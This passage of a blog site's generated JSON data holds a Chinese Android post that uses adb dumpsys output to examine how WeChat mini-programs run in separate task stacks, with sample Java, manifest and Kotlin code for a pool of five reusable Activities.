Small4 extends SmallActivity {}\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_small);\n        \n        // 动态地给小程序Activity设置名称和图标，下面代码只是举例，实际信息肯定是动态获取的\n        // 由于iconRes这个构造参数的API 28才加入的，所以建议区分版本\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {\n            int iconRes = 0; // 这里应该是小程序图标的资源索引\n            setTaskDescription(new ActivityManager.TaskDescription(\"小程序名\", iconRes));\n        } else {\n            Bitmap iconBmp = null; // 这里应该是小程序图标的bitmap\n            setTaskDescription(new ActivityManager.TaskDescription(\"小程序名\", iconBmp));\n        }\n    }\n}\n```\n\nManifest：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    package=\"com.ysy.smallapp\">\n\n    <application\n        ...>\n\n        <activity android:name=\".MainActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n\n        <activity\n            android:name=\".SmallActivity$Small0\"\n            android:label=\"Small0\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small0\"\n            android:taskAffinity=\".Small0\" />\n\n        <activity\n            android:name=\".SmallActivity$Small1\"\n            android:label=\"Small1\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small1\"\n            android:taskAffinity=\".Small1\" />\n\n        <activity\n            android:name=\".SmallActivity$Small2\"\n            android:label=\"Small2\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small2\"\n            android:taskAffinity=\".Small2\" />\n\n        <activity\n            android:name=\".SmallActivity$Small3\"\n            android:label=\"Small3\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small3\"\n            android:taskAffinity=\".Small3\" />\n\n        <activity\n            android:name=\".SmallActivity$Small4\"\n            android:label=\"Small4\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small4\"\n            android:taskAffinity=\".Small4\" />\n\n    </application>\n\n</manifest>\n```\n\n具体的复用逻辑这里暂时就这样简单地实现了，实际情况肯定比此复杂：\n\n```kotlin\nclass MainActivity : AppCompatActivity() {\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContentView(R.layout.activity_main)\n\n        val edtText = findViewById<EditText>(R.id.edt_main)\n\n        findViewById<View>(R.id.btn_main).setOnClickListener {\n            startActivity(Intent().apply {\n                val id = edtText.text.toString().toInt() % 5\n                setClassName(this@MainActivity, \"com.ysy.smallapp.SmallActivity\\$Small$id\")\n            })\n        }\n    }\n}\n```\n\n完整源码：\n[https://github.com/ysy950803/SmallApp](https://github.com/ysy950803/SmallApp)\n","source":"_posts/2019-04-27-微信小程序任务栈实现原理.md","raw":"---\nlayout:     post\ntitle:      微信小程序任务栈实现原理\nsubtitle:   探寻小程序的根基。\ndate:       2019-04-27\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - 前端\n---\n\n## 背景\n\n之前面试一些校招同学，聊到微信小程序是什么launchMode，其任务栈是如何实现的？很多同学只提到singleInstance，这是不合适的。\n今天我们就猜测并解析一下微信主程序与小程序的关系与大致实现，最后给出源码，可以给大家作一个简单参考。\n\n## 初探\n\n既然要研究微信，那么我们就先打开几个小程序，再用adb命令看看任务栈信息。\n在终端使用 `adb shell dumpsys activity activities` 命令后，可以找到最近任务列表的Activity信息：\n\n```\nRunning activities (most recent first):\n  TaskRecord{caccd90 #3239 A=.AppBrandUI3 U=0 StackId=1 sz=1}\n    Run #4: ActivityRecord{bb162b8 u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI3 t3239}\n  TaskRecord{d6c62d6 #3190 A=com.tencent.mm U=0 StackId=1 sz=1}\n    Run #3: ActivityRecord{7f2d805 u0 com.tencent.mm/.ui.LauncherUI t3190}\n  TaskRecord{34a386a #3238 A=.AppBrandUI2 U=0 StackId=1 sz=1}\n    Run #2: ActivityRecord{16cfede u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI2 t3238}\n  TaskRecord{7ade2d1 #3237 A=.AppBrandUI U=0 StackId=1 sz=1}\n    Run #1: ActivityRecord{ccfd8ae u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI t3237}\n  ...\n```\n\n可以发现这里的#3是微信主Activity，4、2、1都是我开的小程序，且位于不同的任务栈中，Activity名称都是AppBrandUI+数字的形式。\n然后再看看其他关键信息（这里我单独筛出来）：\n\n```\npackageName=com.tencent.mm processName=com.tencent.mm\ntaskAffinity=com.tencent.mm\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand3\ntaskAffinity=.AppBrandUI3\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand2\ntaskAffinity=.AppBrandUI2\n\npackageName=com.tencent.mm processName=com.tencent.mm:appbrand\ntaskAffinity=.AppBrandUI\n```\n\n很简单，和我们平时实现多进程差不多，说明是给Activity设置了process属性。\n\n## 思考\n\n转念一想，小程序那么多，难道这些不同后缀的Activity都写死在代码里吗？\n显然不能这么干，只能两种途径可以达成目的：\n\n- 不在Manifest里面静态注册Activity，使用类似Hook的方式动态创建进程和Activity\n- 动静结合，设计一个Activity池，在本地写死有限数量的Activity，通过复用的方式承载小程序\n\n对于第一种，我查阅了一些资料，理论上讲是可以做到的，涉及到NDK开发，需要我们对AMS的源码很熟悉，不走常规流程启动Activity，且小程序是多进程的，可能还需要手动fork进程。\n这种方式显然具有较大的风险，属于黑科技范畴，而且谷歌官方是不推荐的，微信作为十几亿用户的常驻App，几乎不太可能使用这一方案。\n\n那么只剩第二种了，预先在本地写死n个一样的Activity（当然也可以通过继承形式），同时在Manifest中注册好。\n然后打开一个小程序就占用一个Activity，当打开第n+1个小程序时，覆盖第1个小程序所在的Activity，这样就相当于第1个小程序被顶掉了。\n\n分析到此，就很明显了，如果真的是第二种方案，那么小程序就不能无限数量地打开咯？果断打开微信试了一下，果然，最多只能开5个！当你启动第6个小程序时，第1个就被销毁了。\n其实这也是符合我们上述预期的，每个小程序的进程不一样，taskAffinity也不一样，类名也不一样。原生API是不支持动态设置taskAffinity和进程名的。\n\n## 简单实现\n\n小程序所在的Activity：\n\n```java\npublic class SmallActivity extends AppCompatActivity {\n\n    public static class Small0 extends SmallActivity {}\n    public static class Small1 extends SmallActivity {}\n    public static class Small2 extends SmallActivity {}\n    public static class Small3 extends SmallActivity {}\n    public static class Small4 extends SmallActivity {}\n\n    @Override\n    protected void onCreate(@Nullable Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_small);\n        \n        // 动态地给小程序Activity设置名称和图标，下面代码只是举例，实际信息肯定是动态获取的\n        // 由于iconRes这个构造参数的API 28才加入的，所以建议区分版本\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {\n            int iconRes = 0; // 这里应该是小程序图标的资源索引\n            setTaskDescription(new ActivityManager.TaskDescription(\"小程序名\", iconRes));\n        } else {\n            Bitmap iconBmp = null; // 这里应该是小程序图标的bitmap\n            setTaskDescription(new ActivityManager.TaskDescription(\"小程序名\", iconBmp));\n        }\n    }\n}\n```\n\nManifest：\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    package=\"com.ysy.smallapp\">\n\n    <application\n        ...>\n\n        <activity android:name=\".MainActivity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n\n        <activity\n            android:name=\".SmallActivity$Small0\"\n            android:label=\"Small0\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small0\"\n            android:taskAffinity=\".Small0\" />\n\n        <activity\n            android:name=\".SmallActivity$Small1\"\n            android:label=\"Small1\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small1\"\n            android:taskAffinity=\".Small1\" />\n\n        <activity\n            android:name=\".SmallActivity$Small2\"\n            android:label=\"Small2\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small2\"\n            android:taskAffinity=\".Small2\" />\n\n        <activity\n            android:name=\".SmallActivity$Small3\"\n            android:label=\"Small3\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small3\"\n            android:taskAffinity=\".Small3\" />\n\n        <activity\n            android:name=\".SmallActivity$Small4\"\n            android:label=\"Small4\"\n            android:launchMode=\"singleTask\"\n            android:process=\":Small4\"\n            android:taskAffinity=\".Small4\" />\n\n    </application>\n\n</manifest>\n```\n\n具体的复用逻辑这里暂时就这样简单地实现了，实际情况肯定比此复杂：\n\n```kotlin\nclass MainActivity : AppCompatActivity() {\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContentView(R.layout.activity_main)\n\n        val edtText = findViewById<EditText>(R.id.edt_main)\n\n        findViewById<View>(R.id.btn_main).setOnClickListener {\n            startActivity(Intent().apply {\n                val id = edtText.text.toString().toInt() % 5\n                setClassName(this@MainActivity, \"com.ysy.smallapp.SmallActivity\\$Small$id\")\n            })\n        }\n    }\n}\n```\n\n完整源码：\n[https://github.com/ysy950803/SmallApp](https://github.com/ysy950803/SmallApp)\n","slug":"微信小程序任务栈实现原理","published":1,"updated":"2024-03-25T07:31:25.854Z","comments":1,"photos":[],"link":"","_id":"cluaufh0k000tthe61p3ic2u9","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>之前面试一些校招同学，聊到微信小程序是什么launchMode，其任务栈是如何实现的？很多同学只提到singleInstance，这是不合适的。<br>今天我们就猜测并解析一下微信主程序与小程序的关系与大致实现，最后给出源码，可以给大家作一个简单参考。</p>\n<h2 id=\"初探\"><a href=\"#初探\" class=\"headerlink\" title=\"初探\"></a>初探</h2><p>既然要研究微信，那么我们就先打开几个小程序，再用adb命令看看任务栈信息。<br>在终端使用 <code>adb shell dumpsys activity activities</code> 命令后，可以找到最近任务列表的Activity信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Running activities (most recent first):</span><br><span class=\"line\">  TaskRecord&#123;caccd90 #3239 A=.AppBrandUI3 U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #4: ActivityRecord&#123;bb162b8 u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI3 t3239&#125;</span><br><span class=\"line\">  TaskRecord&#123;d6c62d6 #3190 A=com.tencent.mm U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #3: ActivityRecord&#123;7f2d805 u0 com.tencent.mm/.ui.LauncherUI t3190&#125;</span><br><span class=\"line\">  TaskRecord&#123;34a386a #3238 A=.AppBrandUI2 U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #2: ActivityRecord&#123;16cfede u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI2 t3238&#125;</span><br><span class=\"line\">  TaskRecord&#123;7ade2d1 #3237 A=.AppBrandUI U=0 StackId=1 sz=1&#125;</span><br><span class=\"line\">    Run #1: ActivityRecord&#123;ccfd8ae u0 com.tencent.mm/.plugin.appbrand.ui.AppBrandUI t3237&#125;</span><br><span class=\"line\">  ...</span><br></pre></td></tr></table></figure>\n\n<p>可以发现这里的#3是微信主Activity，4、2、1都是我开的小程序，且位于不同的任务栈中，Activity名称都是AppBrandUI+数字的形式。<br>然后再看看其他关键信息（这里我单独筛出来）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm</span><br><span class=\"line\">taskAffinity=com.tencent.mm</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand3</span><br><span class=\"line\">taskAffinity=.AppBrandUI3</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand2</span><br><span class=\"line\">taskAffinity=.AppBrandUI2</span><br><span class=\"line\"></span><br><span class=\"line\">packageName=com.tencent.mm processName=com.tencent.mm:appbrand</span><br><span class=\"line\">taskAffinity=.AppBrandUI</span><br></pre></td></tr></table></figure>\n\n<p>很简单，和我们平时实现多进程差不多，说明是给Activity设置了process属性。</p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>转念一想，小程序那么多，难道这些不同后缀的Activity都写死在代码里吗？<br>显然不能这么干，只能两种途径可以达成目的：</p>\n<ul>\n<li>不在Manifest里面静态注册Activity，使用类似Hook的方式动态创建进程和Activity</li>\n<li>动静结合，设计一个Activity池，在本地写死有限数量的Activity，通过复用的方式承载小程序</li>\n</ul>\n<p>对于第一种，我查阅了一些资料，理论上讲是可以做到的，涉及到NDK开发，需要我们对AMS的源码很熟悉，不走常规流程启动Activity，且小程序是多进程的，可能还需要手动fork进程。<br>这种方式显然具有较大的风险，属于黑科技范畴，而且谷歌官方是不推荐的，微信作为十几亿用户的常驻App，几乎不太可能使用这一方案。</p>\n<p>那么只剩第二种了，预先在本地写死n个一样的Activity（当然也可以通过继承形式），同时在Manifest中注册好。<br>然后打开一个小程序就占用一个Activity，当打开第n+1个小程序时，覆盖第1个小程序所在的Activity，这样就相当于第1个小程序被顶掉了。</p>\n<p>分析到此，就很明显了，如果真的是第二种方案，那么小程序就不能无限数量地打开咯？果断打开微信试了一下，果然，最多只能开5个！当你启动第6个小程序时，第1个就被销毁了。<br>其实这也是符合我们上述预期的，每个小程序的进程不一样，taskAffinity也不一样，类名也不一样。原生API是不支持动态设置taskAffinity和进程名的。</p>\n<h2 id=\"简单实现\"><a href=\"#简单实现\" class=\"headerlink\" title=\"简单实现\"></a>简单实现</h2><p>小程序所在的Activity：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SmallActivity</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AppCompatActivity</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small0</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small1</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small2</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small3</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Small4</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallActivity</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onCreate</span><span class=\"params\">(<span class=\"meta\">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_small);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">// 动态地给小程序Activity设置名称和图标，下面代码只是举例，实际信息肯定是动态获取的</span></span><br><span class=\"line\">        <span class=\"comment\">// 由于iconRes这个构造参数的API 28才加入的，所以建议区分版本</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.P) &#123;</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">iconRes</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; <span class=\"comment\">// 这里应该是小程序图标的资源索引</span></span><br><span class=\"line\">            setTaskDescription(<span class=\"keyword\">new</span> <span class=\"title class_\">ActivityManager</span>.TaskDescription(<span class=\"string\">&quot;小程序名&quot;</span>, iconRes));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Bitmap</span> <span class=\"variable\">iconBmp</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>; <span class=\"comment\">// 这里应该是小程序图标的bitmap</span></span><br><span class=\"line\">            setTaskDescription(<span class=\"keyword\">new</span> <span class=\"title class_\">ActivityManager</span>.TaskDescription(<span class=\"string\">&quot;小程序名&quot;</span>, iconBmp));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Manifest：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">manifest</span> <span class=\"attr\">xmlns:android</span>=<span class=\"string\">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">xmlns:tools</span>=<span class=\"string\">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">package</span>=<span class=\"string\">&quot;com.ysy.smallapp&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">application</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">...</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">action</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">category</span> <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">intent-filter</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">activity</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small0&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small1&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small1&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small2&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small2&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small3&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small3&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">activity</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;.SmallActivity$Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:label</span>=<span class=\"string\">&quot;Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:launchMode</span>=<span class=\"string\">&quot;singleTask&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:process</span>=<span class=\"string\">&quot;:Small4&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">android:taskAffinity</span>=<span class=\"string\">&quot;.Small4&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">application</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>具体的复用逻辑这里暂时就这样简单地实现了，实际情况肯定比此复杂：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MainActivity</span> : <span class=\"type\">AppCompatActivity</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">override</span> <span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">onCreate</span><span class=\"params\">(savedInstanceState: <span class=\"type\">Bundle</span>?)</span></span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState)</span><br><span class=\"line\">        setContentView(R.layout.activity_main)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">val</span> edtText = findViewById&lt;EditText&gt;(R.id.edt_main)</span><br><span class=\"line\"></span><br><span class=\"line\">        findViewById&lt;View&gt;(R.id.btn_main).setOnClickListener &#123;</span><br><span class=\"line\">            startActivity(Intent().apply &#123;</span><br><span class=\"line\">                <span class=\"keyword\">val</span> id = edtText.text.toString().toInt() % <span class=\"number\">5</span></span><br><span class=\"line\">                setClassName(<span class=\"keyword\">this</span><span class=\"symbol\">@MainActivity</span>, <span class=\"string\">&quot;com.ysy.smallapp.SmallActivity\\$Small<span class=\"variable\">$id</span>&quot;</span>)</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>完整源码：<br><a href=\"https://github.com/ysy950803/SmallApp\">https://github.com/ysy950803/SmallApp</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>之前面试一些校招同学，聊到微信小程序是什么launchMode，其任务栈是如何实现的？很多同学只提到singleInstance，这是不合适的。<br>今天我们就猜测并解析一下微信主程序与小程序的关系与大致实现，最后给出源码，可以给大家作一个简单参考。</p>\n<h2 id=\"初探\"><a href=\"#初探\" class=\"headerlink\" title=\"初探\"></a>初探</h2><p>既然要研究微信，那么我们就先打开几个小程序，再用adb命令看看任务栈信息。<br>在终端使用 <code>adb shell dumpsys activity activities</code> 